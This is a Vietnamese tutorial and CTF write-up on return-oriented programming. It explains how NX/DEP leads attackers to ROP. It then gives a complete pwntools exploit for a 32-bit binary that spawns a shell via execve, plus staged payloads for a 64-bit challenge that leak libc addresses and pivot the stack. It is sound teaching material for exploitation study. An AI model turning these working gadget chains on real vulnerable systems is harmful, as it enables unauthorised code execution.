
# Return-Oriented Programming (ROP) Explanation
___

### Tại sao có kỹ thuật tấn công ROP?

Sự xuất hiện của các cơ chế bảo vệ như Non-executable (NX) hay Data Execution Prevention (DEP) giúp chống thực thi code ở vùng nhớ không cho phép. Có nghĩa là khi chúng ta khai thác lỗ hổng Buffer Overflow (BOF) của một chương trình, nếu chương trình này có cơ chế bảo vệ NX hay DEP thì shellcode chúng ta chèn vào xem như vô dụng - bởi vì vùng nhớ lưu shellcode đã bị đánh dấu là không được thực thi.

ROP là một kỹ thuật tấn công tận dụng các đoạn code có sẵn của chương trình (.code section) Ý tưởng chính là sử dụng các gadget hiện có trong chương trình trên cơ sở tràn bộ đệm ngăn xếp. Thay đổi giá trị của một số thanh ghi hoặc các biến để điều khiển luồng thực thi của chương trình. Gadget là các chuỗi lệnh kết thúc bằng ret. Thông qua các chuỗi lệnh này, chúng ta có thể sửa đổi nội dung của một số địa chỉ nhất định để tạo điều kiện thuận lợi cho việc kiểm soát luồng thực thi của chương trình.

Nó được gọi là ROP vì cốt lõi là sử dụng lệnh ret trong tập lệnh để thay đổi thứ tự thực thi của luồng lệnh. Các cuộc tấn công ROP thường phải đáp ứng các điều kiện sau:

- Có một phần tràn trong chương trình và địa chỉ trả về có thể được kiểm soát.

- Bạn có thể tìm thấy các gadget đáp ứng các điều kiện và địa chỉ của các gadget tương ứng.
- Kỹ năng cơ bản của rop, bạn phải đọc hiểu 1 số lệnh assembly cơ bản như: mov , lea, leave, pop, push, syscall(x64), int 0x80 (32 bit tương đương với syscall trong x64), ret, jmp, call, ...

## Ví dụ cơ bản:
> # Challenge: [ROPbasic](https://github.com/shawking2/Writeup/blob/main/ROP/src/rop?raw=true)

Ta có thể dễ dàng nhận ra lỗ hổng tràn bộ đệm ở hàm gets.
Phân tích qua lệnh file:
```
$ file rop
rop: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=2bff0285c2706a147e7b150493950de98f182b78, with debug_info, not stripped
```
statically linked có nghĩa tất cả các thư viện bắt buộc đều được bao gồm trong file binary. Điều này có nghĩa là file binary không cần tải bất kỳ thư viện nào như libc. Các cách khai thác lợi dụng got
sẽ không khả thi.
Phân tích qua checksec:
```
$ checksec rop
[*] '/mnt/d/19520/rop'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
Xem mã giả bằng IDA:
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("This time, no system() and NO SHELLCODE!!!");
  puts("What do you plan to do?");
  gets(&v4);
  return 0;
}
```
Với lỗ hổng ở hàm gets ta có thể dễ dàng điểu khiển return addr. Với offset của v4 với ebp là 0x64.
Tiếp theo ta sẽ sử dụng kỹ thuật ROP để khai thác. Ta sẽ lợi dụng system call ```execve("/bin/sh",NULL,NULL)``` để giúp ta có được shell. Nếu bạn nào còn chưa biết system call là gì có thể tham khảo ở đây: https://en.wikipedia.org/wiki/System_call
Yêu cầu của system call execve ```execve("/bin/sh",NULL,NULL)```:
- eax = 0xb (đây là số system call của execve , eax sẽ luôn là thanh ghi chưa giá trị này)
- ebx sẽ chứa tham số thứ nhất -> ebx phải trỏ đến địa chỉ chưa chuỗi "/bin/sh"
- ecx sẽ chứa tham số thứ hai -> ecx = 0 (0 -> NULL)
- edx sẽ chứa tham số thứ ba -> edx = 0
Để kiểm soát các thanh ghi này ta sẽ sử dụng các gadget. Công cụ Ropgadget sẽ giúp chúng ta dễ dàng tìm kiếm chúng.
```
ROPgadget --binary rop
```
Kiểm soát giá trị cho eax:
```
$ ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080bb196 : pop eax ; ret
0x0807217a : pop eax ; ret 0x80e
0x0804f704 : pop eax ; ret 3
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
```
Khi ret trỏ đến địa chỉ gadget ```0x080bb196 : pop eax ; ret``` nó sẽ lấy thực thi lệnh pop lấy giá trị tại esp trỏ tới gán cho eax sau đó tiếp tục thực hiện ret.
Các gadget khác cũng tìm kiếm theo cách tương tự
```
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
```
Chuỗi "/bin/sh" đã tồn tại sẵn trong file: 
```
ret2syscall ROPgadget --binary rop  --string '/bin/sh' 
Strings information
============================================================
0x080be408 : /bin/sh
```
Và cuối cùng gadget quan trọng nhất int 0x80 (ở x64 sẽ là gadget syscall):
```
ret2syscall ROPgadget --binary rop  --only 'int'                 
Gadgets information
============================================================
0x08049421 : int 0x80
0x080938fe : int 0xbb
0x080869b5 : int 0xf6
0x0807b4d4 : int 0xfc

Unique gadgets found: 4
```
Chúng ta sẽ lần lượt đặt các gadget này tại địa chỉ của return addr của hàm main, tiếp sau là giá trị mà muốn các thanh ghi lưu trữ và tiếp theo là gadget tiếp theo cần thực thi. 
Hình mô tả:
![screen](https://github.com/shawking2/Writeup/blob/main/ROP/img/imgrop.png)
Code khai thác (python2):
```
from pwn import *

p = process('./rop')

pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
binsh = 0x80be408
payload = "A"*112 # 0x64 + 4
payload += p32(pop_eax_ret)
payload += p32(0xb)
payload += p32(pop_edx_ecx_ebx_ret)
payload += p32(0)
payload += p32(0)
payload += p32(binsh)
payload += p32(int_0x80)
p.sendline(payload)
p.interactive()
```
## Challenge 32bit: [rop2](https://github.com/shawking2/Writeup/blob/main/ROP/src/rop2?raw=true)

### Demo 64bit:
> # Challenge name: external
## file challenge: [external](https://github.com/19520611/Writeup/blob/main/0x41414141/src/external/external?raw=true) [libc](https://github.com/19520611/Writeup/blob/main/0x41414141/src/external/libc-2.28.so?raw=true)

Phân tích file:

file:
```
$ file external
external: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=06cea603bc177acf3effdea190ad8a3c88a2a7a0, for GNU/Linux 3.2.0, not stripped
```
checksec:
```
$ checksec  external
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Xem mã giả bằng IDA pro:
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [rsp+0h] [rbp-50h]

  puts("ROP me ;)");
  printf("> ", argv);
  read(0, &buf, 0xF0uLL);
  clear_got(0LL, &buf);
  return 0;
}
```
Ta dễ dàng nhận thấy lỗi buffer overflow xảy ra ở hàm read, khi buf nằm ở offset $rbp-0x32 mà hàm read lại đọc đến 0xf0. Nhưng lưu ý trong chương trình có hàm clear_got. Quan sát xem hàm này làm gì với got(global offset table):

GOT trước khi hàm clear_got được gọi:
```
0x403ff8:       0x0000000000000000      0x0000000000403e10
0x404008:       0x00007ffff7ffe180      0x00007ffff7fe85e0
0x404018 <puts@got.plt>:        0x00007ffff7e64550      0x00007ffff7e6b4b0
0x404028 <printf@got.plt>:      0x00007ffff7e44c50      0x0000000000401066
0x404038 <alarm@got.plt>:       0x00007ffff7eb9270      0x00007ffff7edcde0
0x404048 <signal@got.plt>:      0x00007ffff7e29ac0      0x0000000000000000
0x404058:       0x0000000000000000      0x00007ffff7fad6a0
0x404068:       0x0000000000000000      0x00007ffff7fac980
0x404078 <completed.0>: 0x0000000000000000      0x0000000000000000
0x404088:       0x0000000000000000      0x0000000000000000
0x404098:       0x0000000000000000      0x0000000000000000
```
GOT sau khi hàm clear_got được gọi:
```
0x403ff8:       0x0000000000000000      0x0000000000403e10
0x404008:       0x00007ffff7ffe180      0x00007ffff7fe85e0
0x404018 <puts@got.plt>:        0x0000000000000000      0x0000000000000000
0x404028 <printf@got.plt>:      0x0000000000000000      0x0000000000000000
0x404038 <alarm@got.plt>:       0x0000000000000000      0x0000000000000000
0x404048 <signal@got.plt>:      0x0000000000000000      0x0000000000000000
0x404058:       0x0000000000000000      0x00007ffff7fad6a0
0x404068:       0x0000000000000000      0x00007ffff7fac980
0x404078 <completed.0>: 0x0000000000000000      0x0000000000000000
```
Quan sát got ta thấy rằng địa chỉ của các hàm libc trong main đã bị xóa. Nên nếu ta điều khiển chương trình quay lại hàm main hay nhảy đến 1 hàm đã bị xóa trong got thì chương trình sẽ bị crash.

Quan sát 2 địa chỉ nằm dưới got của signal:
```
pwndbg> x/x 0x00007ffff7fad6a0
0x7ffff7fad6a0 <_IO_2_1_stdout_>:       0x00000000fbad2887
pwndbg> x/x 0x00007ffff7fac980
0x7ffff7fac980 <_IO_2_1_stdin_>:        0x00000000fbad208b
```
Thì ra đây là địa chỉ của _IO_2_1_stdoin_ và _IO_2_1_stdout_. 

Quan sát các gadget:
```
$ ROPgadget  --binary external
Gadgets information
============================================================
              .....................
0x00000000004011a2 : call qword ptr [rax + 0x4855c35d]
0x0000000000401014 : call rax
0x0000000000401183 : cli ; jmp 0x401111
0x00000000004010d3 : cli ; ret
0x000000000040130b : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401180 : endbr64 ; jmp 0x401114
0x00000000004010d0 : endbr64 ; ret
0x00000000004012dc : fisttp word ptr [rax - 0x7d] ; ret
0x0000000000401042 : fisubr dword ptr [rdi] ; add byte ptr [rax], al ; push 1 ; jmp 0x401029
0x00000000004010ce : hlt ; nop ; endbr64 ; ret
0x0000000000401012 : je 0x401018 ; call rax
0x00000000004010f7 : je 0x401107 ; mov edi, 0x404060 ; jmp rax
0x0000000000401139 : je 0x40114f ; mov edi, 0x404060 ; jmp rax
0x000000000040103b : jmp 0x401020
0x0000000000401184 : jmp 0x401110
0x00000000004010fe : jmp rax
0x00000000004011d8 : ; ret
0x00000000004010f9 : mov edi, 0x404060 ; jmp rax
0x0000000000401270 : mov rax, 0xe7 ; syscall
0x000000000040127c : mov rax, 1 ; syscall
0x00000000004010cf : nop ; endbr64 ; ret
0x00000000004011d7 : nop ; leave ; ret
0x00000000004011a3 : nop ; pop rbp ; ret
0x000000000040116f : nop ; ret
0x0000000000401143 : nop dword ptr [rax + rax] ; ret
0x000000000040117c : nop dword ptr [rax] ; endbr64 ; jmp 0x401118
0x0000000000401142 : nop word ptr [rax + rax] ; ret
0x0000000000401168 : or ebp, dword ptr [rdi] ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040127b : or ecx, dword ptr [rax - 0x39] ; rol byte ptr [rcx], 0 ; add byte ptr [rax], al ; syscall
0x0000000000401273 : out 0, eax ; add byte ptr [rax], al ; syscall
0x00000000004012ec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004012ee : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004012f0 : pop r14 ; pop r15 ; ret
0x00000000004012f2 : pop r15 ; ret
0x00000000004012eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004012ef : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000040116d : pop rbp ; ret
0x00000000004012f3 : pop rdi ; ret
0x00000000004012f1 : pop rsi ; pop r15 ; ret
0x00000000004012ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040101a : ret
0x0000000000401277 : syscall
              ..................
Unique gadgets found: 106
```
Mình đã lọc bớt gadget hiển thị ra để WU đỡ dài. Quan sát gadget ta thấy ta có thể điều khiển được thanh ghi $rax (giá trị =0 và = 1), $rdi, $rsi và cả $rbp và $rsp nữa :)) và 1 gadget quan trọng đó là syscall.
> ## Ý tưởng khai thác:
> ### payload đầu tiên:
Ý tưởng khai thác:
- Đầu tiên mình sẽ đè bằng 1 địa chỉ mà mình xác định được có quyền write (mình chọn ở phân vùng .bss). Bởi vì khi lệnh leave (của hàm main) thực thi thì $rbp = address_bss mà mình đã ghì đè. 
- Tiếp theo tận dụng giá trị $rax bằng 0 sẵn có mình gọi syscall read, với giá trị của ```$rsi = address_bss```. Vậy tại sao mình lạ read ở address_bss? Bởi bị khi mình sử dụng gadget ```mov eax, 0 ; leave ; ret``` để set $eax = 0 để có thể gọi read lại thì lúc này đến lệnh leave (mình sẽ gọi là lệnh leave thứ 2) ```$rsp sẽ nằm tại``` địa chỉ của ```$rbp hiện tại tức address_bss```.
- Sau khi setup cho syscal read mình sẽ setup để syscall write được chạy. Lợi dụng syscall write mình sẽ set ```$rsi = got_IO_2_1_stdout_```,  Và fd sẽ bằng 1 tức thanh ghi ```$rdi```. Vậy khi syscall write chạy sẽ in ra got_IO_2_1_stdout_ và got_IO_2_1_stdin_ như mình đã đề cập trên got. Sử dụng gadget ```mov rax, 1 ; syscall``` để gọi syscall write
- Hàm write sẽ in ra ra cho ta 2 addr của _IO_2_1_stdout_ và _IO_2_1_stdin_ lên trang https://libc.blukat.me/ để search libc (Nhưng mình quên là tác giả cho sắn libc). sau đó tính libc base.
- Cuối của lần nhập đầu tiên ta sẽ chạy gadget ```mov rax, 1 ; syscall``` cho lần read thứ 2 (tức payload thứ 3) và điều khiển $rsp về  address_bss mà ta mong muốn 
```
    payload = "A"*0x50
    payload += p64(bss) # $rbp
    """ Goi syscall read để ghi input vào bss"""
    #payload += p64(func_rtc)
    payload += p64(pop_rsi_pop_r15_ret)
    payload += p64(bss)
    payload += p64(0)
    payload += p64(pop_rdi)
    payload += p64(0)
    payload += p64(systemcall)
    """Goi syscall write để in ra addr"""
    payload += p64(0x4012f1) # gadget pop rsi ; pop r15 ; ret
    payload += p64(0x404060) # got cua  got_IO_2_1_stdout_
    payload += p64(0)
    payload += p64(pop_rdi) 
    payload += p64(1)
    payload += p64(func_ws) # gadget mov rax, 1 ; syscall
    """Gán eax = 0 cho lần gọi read tiếp theo"""
    payload += p64(mov_eax_0_leave_ret)
```
> ### payload thứ 2:
- Đây là lần syscall read đầu tiên mà ta cho nó nhập trên address_bss. 
- Đầu tiên đây sẽ là địa chỉ mà sau khi lệnh ```leave thứ 2``` được gọi ```$rsp``` sẽ nhảy tới nên ta ghì đè bằng 1 giá trị bất kỳ.
- Tiếp theo mình sẽ setup ở đây 1 syscall read (gọi read lần 2) . Sau lệnh leave thứ 2 là lệnh ```ret``` chương trình sẽ thực thi gadget mà ở syscall read đầu tiên ta gọi. Mình sẽ gán $rsi = address_bss + 0x38 tức là sau gadget syscall để gọi read lần 2.
- Bởi vì ta gọi syscall read nên ta sẽ gán $rdi = 0 tức fd = 0
```
    payload = p64(0) # 8 byte giá trị bất kỳ ở đây
    payload += p64(pop_rsi_pop_r15_ret)
    payload += p64(bss+0x38) # tức ta sẽ ghi input nhập vào sau gadget syscall ở dưới 
    payload += p64(0)
    payload += p64(pop_rdi)
    payload += p64(0)
    payload += p64(systemcall)
```
> ### payload thứ 3:
- Lúc này ta đã có libc base rồi, công việc lúc này là $rdi = address /bin/sh, gọi hàm system trong libc và lên shell.
> File solve: [exploit.py](https://github.com/shawking2/Writeup/blob/main/0x41414141/src/external/external.py)





